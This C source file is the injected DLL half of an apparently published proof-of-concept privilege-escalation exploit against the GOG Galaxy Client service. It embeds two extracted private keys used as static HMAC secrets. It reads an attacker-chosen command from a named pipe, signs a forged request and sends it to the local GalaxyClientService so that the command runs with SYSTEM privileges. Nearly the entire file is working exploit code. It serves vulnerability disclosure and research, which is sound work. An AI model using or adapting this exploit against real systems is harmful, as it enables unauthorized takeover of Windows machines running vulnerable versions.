/* galaxy_dll_inject_privesc_dll.c
 * Copyright (C) 2020  Joe Testa <jtesta@positronsecurity.com>
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms version 3 of the GNU General Public License as
 * published by the Free Software Foundation.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 *
 * This GOG Galaxy Client proof-of-concept exploit will communicate with
 * the GalaxyClientService Windows service (via 127.0.0.1:9978) and
 * requests that it execute arbitrary commands with SYSTEM privileges.
 * The service authenticates requests using an HMAC, but unfortunately,
 * the static key is hard-coded in the GalaxyClientService.exe
 * executable.
 *
 * This POC is designed for use against Galaxy Client v2.0.13 - v2.0.15.
 * Prior versions allowed anyone to communicate with the
 * GalaxyClientService, but these versions require client sockets be
 * created from GalaxyClient.exe.  Hence, we must inject code into
 * GalaxyClient.exe in order to successfully trigger the exploit.
 *
 * This source file forms the back-end of the exploit.  It forms the
 * DLL file which is injected by the front-end into GalaxyClient.exe.
 * It then creates a named pipe ("galaxy_poc") to read the command,
 * arguments, and working directory from the front-end, builds & signs
 * the payload, then sends it to the privileged GalaxyClientService.
 */

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <winternl.h>
#include <bcrypt.h>

#include <stdio.h>
#include <string.h>

#define TIMEOUT 30000 /* Socket timeout, in milliseconds. */
#define MSGBOX_TITLE "Galaxy Privilege Escalation POC" /* The title of error message boxes. */


/* This is the key used to create HMAC-SHA512 tags with in GOG GalaxyClientService v2.0.0 - 2.0.15 (and possibly up to 2.0.18). */
const char key1[] = "-----BEGIN RSA PRIVATE KEY-----\n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\n-----END RSA PRIVATE KEY-----";

/* This is the key used to create HMAC-SHA512 tags with in GOG GalaxyClientService v2.0.19 (and possibly 2.0.16 to 2.0.18, though this is untested). */
const char key2[] = "-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEAy8Dbv8prpJ/0kKhlGeJYozo2t60EG8L0561g13R29LvMR5hy\nvGZlGJpmn65+A4xHXInJYiPuKzrKUnApeLZ+vw1HocOAZtWK0z3r26uA8kQYOKX9\nQt/DbCdvsF9wF8gRK0ptx9M6R13NvBxvVQApfc9jB9nTzphOgM4JiEYvlV8FLhg9\nyZovMYd6Wwf3aoXK891VQxTr/kQYoq1Yp+68i6T4nNq7NWC+UNVjQHxNQMQMzU6l\nWCX8zyg3yH88OAQkUXIXKfQ+NkvYQ1cxaMoVPpY72+eVthKzpMeyHkBn7ciumk5q\ngLTEJAfWZpe4f4eFZj/Rc8Y8Jj2IS5kVPjUywQIDAQABAoIBADhg1u1Mv1hAAlX8\nomz1Gn2f4AAW2aos2cM5UDCNw1SYmj+9SRIkaxjRsE/C4o9sw1oxrg1/z6kajV0e\nN/t008FdlVKHXAIYWF93JMoVvIpMmT8jft6AN/y3NMpivgt2inmmEJZYNioFJKZG\nX+/vKYvsVISZm2fw8NfnKvAQK55yu+GRWBZGOeS9K+LbYvOwcrjKhHz66m4bedKd\ngVAix6NE5iwmjNXktSQlJMCjbtdNXg/xo1/G4kG2p/MO1HLcKfe1N5FgBiXj3Qjl\nvgvjJZkh1as2KTgaPOBqZaP03738VnYg23ISyvfT/teArVGtxrmFP7939EvJFKpF\n1wTxuDkCgYEA7t0DR37zt+dEJy+5vm7zSmN97VenwQJFWMiulkHGa0yU3lLasxxu\nm0oUtndIjenIvSx6t3Y+agK2F3EPbb0AZ5wZ1p1IXs4vktgeQwSSBdqcM8LZFDvZ\nuPboQnJoRdIkd62XnP5ekIEIBAfOp8v2wFpSfE7nNH2u4CpAXNSF9HsCgYEA2l8D\nJrDE5m9Kkn+J4l+AdGfeBL1igPF3DnuPoV67BpgiaAgI4h25UJzXiDKKoa706S0D\n4XB74zOLX11MaGPMIdhlG+SgeQfNoC5lE4ZWXNyESJH1SVgRGT9nBC2vtL6bxCVV\nWBkTeC5D6c/QXcai6yw6OYyNNdp0uznKURe1xvMCgYBVYYcEjWqMuAvyferFGV+5\nnWqr5gM+yJMFM2bEqupD/HHSLoeiMm2O8KIKvwSeRYzNohKTdZ7FwgZYxr8fGMoG\nPxQ1VK9DxCvZL4tRpVaU5Rmknud9hg9DQG6xIbgIDR+f79sb8QjYWmcFGc1SyWOA\nSkjlykZ2yt4xnqi3BfiD9QKBgGqLgRYXmXp1QoVIBRaWUi55nzHg1XbkWZqPXvz1\nI3uMLv1jLjJlHk3euKqTPmC05HoApKwSHeA0/gOBmg404xyAYJTDcCidTg6hlF96\nZBja3xApZuxqM62F6dV4FQqzFX0WWhWp5n301N33r0qR6FumMKJzmVJ1TA8tmzEF\nyINRAoGBAJqioYs8rK6eXzA8ywYLjqTLu/yQSLBn/4ta36K8DyCoLNlNxSuox+A5\nw6z2vEfRVQDq4Hm4vBzjdi3QfYLNkTiTqLcvgWZ+eX44ogXtdTDO7c+GeMKWz4XX\nuJSUVL5+CVjKLjZEJ6Qc2WZLl94xSwL71E41H4YciVnSCQxVc4Jw\n-----END RSA PRIVATE KEY-----";

const char header1[] = "\x00\x93\x08\x04\x10\x01\x18";
const unsigned int header1_len = 7;

const char header2[] = "\x20\xa1\x90\xec\xe6\x05\xc2\x0c\x83\x01\n\x80\x01";
const unsigned int header2_len = 13;

unsigned int make_payload(char *data, unsigned int data_size, unsigned int key_selector, char *command, char *args, char *working_dir);
BOOL run_exploit(HINSTANCE hDLL);


/* The main entry point of this DLL. */
BOOL WINAPI DllMain(HINSTANCE hDLL, DWORD fdwReason, LPVOID lpvReserved) {

  if (fdwReason == DLL_PROCESS_ATTACH) {
    DisableThreadLibraryCalls(hDLL);
    return run_exploit(hDLL);
  } else
    return TRUE;

}


/* Given a command, arguments, and working directory from the exploit front-end,
 * build and sign the payload. */
unsigned int make_payload(char *data, unsigned int data_size, unsigned int key_selector, char *command, char *args, char *working_dir) {
  char payload[512] = {0};
  const char *key = NULL;
  unsigned char payload_hmac[64] = {0};
  unsigned int payload_len = 0, data_len = 0, i = 0;
  NTSTATUS status = 0;
  BCRYPT_ALG_HANDLE alg_handle = NULL;
  BCRYPT_HASH_HANDLE hash_handle = NULL;


  /* Select the correct key to sign with. */
  if (key_selector == 1)
    key = key1;
  else if (key_selector == 2)
    key = key2;

  /* Assemble the unsigned portion of the payload. */
  payload_len = snprintf(payload, sizeof(payload) - 1, "\n%c%s\x12%c\"%s\" %s \x1a%c%s \x01(\x01", strlen(command), command, strlen(command) + strlen(args) + 4, command, args, strlen(working_dir), working_dir);

  /* Generate the HMAC-SHA512 tag using the static key found in
   * GalaxyClientService.exe. */
  status = BCryptOpenAlgorithmProvider(&alg_handle, BCRYPT_SHA512_ALGORITHM, NULL, BCRYPT_ALG_HANDLE_HMAC_FLAG);
  if (!NT_SUCCESS(status)) {
    MessageBox(NULL, "Failed to open SHA512 HMAC provider.", MSGBOX_TITLE, MB_ICONERROR);
    return 0;
  }

  status = BCryptCreateHash(alg_handle, &hash_handle, NULL, 0, (PBYTE)key, strlen(key), 0);
  if (!NT_SUCCESS(status)) {
    MessageBox(NULL, "Failed to create hash.", MSGBOX_TITLE, MB_ICONERROR);
    return 0;
  }

  status = BCryptHashData(hash_handle, (PUCHAR)payload, strlen(payload), 0);
  if (!NT_SUCCESS(status)) {
    MessageBox(NULL, "Failed to hash data.", MSGBOX_TITLE, MB_ICONERROR);
    return 0;
  }

  status = BCryptFinishHash(hash_handle, payload_hmac, sizeof(payload_hmac), 0);
  if (!NT_SUCCESS(status)) {
    MessageBox(NULL, "Failed to extract hash.", MSGBOX_TITLE, MB_ICONERROR);
    return 0;
  }

  if (data_size <= (header1_len + 1 + header2_len + (sizeof(payload_hmac) * 2) + payload_len)) {
    MessageBox(NULL, "Data buffer is too small.", MSGBOX_TITLE, MB_ICONERROR);
    return 0;
  }

  memcpy(data, header1, header1_len);
  data_len += header1_len;

  data_len += snprintf(data + data_len, sizeof(data) - data_len - 1, "%c", payload_len);

  memcpy(data + data_len, header2, header2_len);
  data_len += header2_len;

  for (i = 0; i < sizeof(payload_hmac); i++)
    data_len += snprintf(data + data_len, sizeof(data) - data_len - 1, "%02x", payload_hmac[i]);

  memcpy(data + data_len, payload, payload_len);
  data_len += payload_len;
  return data_len;
}


BOOL run_exploit(HINSTANCE hDLL) {
  char payload[1024] = {0}, err_msg[256] = {0};
  struct addrinfo *result = NULL, hints = {0};
  DWORD timeout = TIMEOUT, bytes_read = 0, bytes_written = 0;
  WSADATA wsaData = {0};
  SOCKET s = INVALID_SOCKET;
  HANDLE hPipe = INVALID_HANDLE_VALUE;
  unsigned int key_selector = 0, command_len = 0, args_len = 0, working_dir_len = 0, payload_len = 0, status = 0;
  char command[256] = {0}, args[256] = {0}, working_dir[256] = {0};
  BOOL pipe_connected = FALSE;


  /* Initialize socket support. */
  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    return TRUE;

  /* Create the named pipe for the host application to tell us the command, args,
   * and working directory with. */
  hPipe = CreateNamedPipe("\\\\.\\pipe\\galaxy_poc", PIPE_ACCESS_DUPLEX, PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT, PIPE_UNLIMITED_INSTANCES, 512, 512, TIMEOUT, NULL);
  if (hPipe == INVALID_HANDLE_VALUE) {
    MessageBox(NULL, "Failed to create named pipe.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  pipe_connected = ConnectNamedPipe(hPipe, NULL) ? TRUE : (GetLastError() == ERROR_PIPE_CONNECTED); 
  if (!pipe_connected) {
    MessageBox(NULL, "Failed to connect to pipe client.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Read the key selector. */
  if (!ReadFile(hPipe, &key_selector, sizeof(key_selector), &bytes_read, NULL)) {
    MessageBox(NULL, "Failed to read key selector from pipe.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Ensure key selector is valid. */
  if ((key_selector != 1) && (key_selector != 2)) {
    MessageBox(NULL, "Invalid key selector.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }
  
  /* Read the command length. */
  if (!ReadFile(hPipe, &command_len, sizeof(command_len), &bytes_read, NULL)) {
    MessageBox(NULL, "Failed to read command length from pipe.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Ensure that the command length will fit into the buffer. */
  if (command_len >= sizeof(command)) {
    snprintf(err_msg, sizeof(err_msg) - 1, "Command length (%u) is bigger than command buffer (%u)!", command_len, sizeof(command));
    MessageBox(NULL, err_msg, MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Read the command into the buffer. */
  if (!ReadFile(hPipe, command, command_len, &bytes_read, NULL)) {
    MessageBox(NULL, "Failed to read command from pipe.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Read the args length. */
  if (!ReadFile(hPipe, &args_len, sizeof(args_len), &bytes_read, NULL)) {
    MessageBox(NULL, "Failed to read args length from pipe.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Ensure that the args length will fit into the buffer. */
  if (args_len >= sizeof(args)) {
    snprintf(err_msg, sizeof(err_msg) - 1, "Args length (%u) is bigger than args buffer (%u)!", args_len, sizeof(args));
    MessageBox(NULL, err_msg, MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Read the args into the buffer. */
  if (!ReadFile(hPipe, args, args_len, &bytes_read, NULL)) {
    MessageBox(NULL, "Failed to read args from pipe.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Read the working directory length. */
  if (!ReadFile(hPipe, &working_dir_len, sizeof(working_dir_len), &bytes_read, NULL)) {
    MessageBox(NULL, "Failed to read working directory length from pipe.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Ensure that the working directory length will fit into the buffer. */
  if (working_dir_len >= sizeof(working_dir)) {
    snprintf(err_msg, sizeof(err_msg) - 1, "Working directory length (%u) is bigger than working directory buffer (%u)!", working_dir_len, sizeof(working_dir));
    MessageBox(NULL, err_msg, MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Read the working directory into the buffer. */
  if (!ReadFile(hPipe, working_dir, working_dir_len, &bytes_read, NULL)) {
    MessageBox(NULL, "Failed to read working directory from pipe.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* Create the signed payload to send off to GalaxyClientService. */
  payload_len = make_payload(payload, sizeof(payload), key_selector, command, args, working_dir);
  if (payload_len == 0) {
    MessageBox(NULL, "Failed to make payload.", MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }

  /* All this code just to create a simple TCP socket... */
  s = socket(AF_INET, SOCK_STREAM, 0);
  if (s == INVALID_SOCKET)
    return TRUE;

  if (setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout, sizeof(timeout)) < 0)
    return TRUE;

  hints.ai_family = AF_UNSPEC;
  hints.ai_socktype = SOCK_STREAM;
  hints.ai_protocol = IPPROTO_TCP;
  if (getaddrinfo("127.0.0.1", "9978", &hints, &result) != 0)
    return TRUE;

  /* Keep trying to connect to the service every 500ms. */
  while(1) {
    if (connect(s, result->ai_addr, (int)result->ai_addrlen) == SOCKET_ERROR)
      Sleep(500);
    else
      break;
  }

  /* Send off the signed payload! */
  if (send(s, payload, payload_len, 0) == SOCKET_ERROR)
    return TRUE;

  /* Receive a response.  If its empty, assume failure and tell the front-end of this. */
  if (recv(s, payload, 4, 0) <= 0) {
    char err[256] = {0};

    status = 0;
    if (!WriteFile(hPipe, &status, sizeof(status), &bytes_written, NULL)) {
      MessageBox(NULL, "Failed to send command result.", MSGBOX_TITLE, MB_ICONERROR);
      return -1;
    }

    snprintf(err, sizeof(err), "Receive error: %d", WSAGetLastError());
    MessageBox(NULL, err, MSGBOX_TITLE, MB_ICONERROR);
    return TRUE;
  }
  closesocket(s);

  /* If we successfully read 4 bytes, we'll assume the exploit succeeded and inform
   * the front-end.  Technically, we could do a better job with parsing the response
   * and validating its HMAC, but that's a huge pain to do in C! */
  status = 1;
  if (!WriteFile(hPipe, &status, sizeof(status), &bytes_written, NULL)) {
    MessageBox(NULL, "Failed to send command result.", MSGBOX_TITLE, MB_ICONERROR);
    return -1;
  }

  CloseHandle(hPipe);
  return TRUE;
}
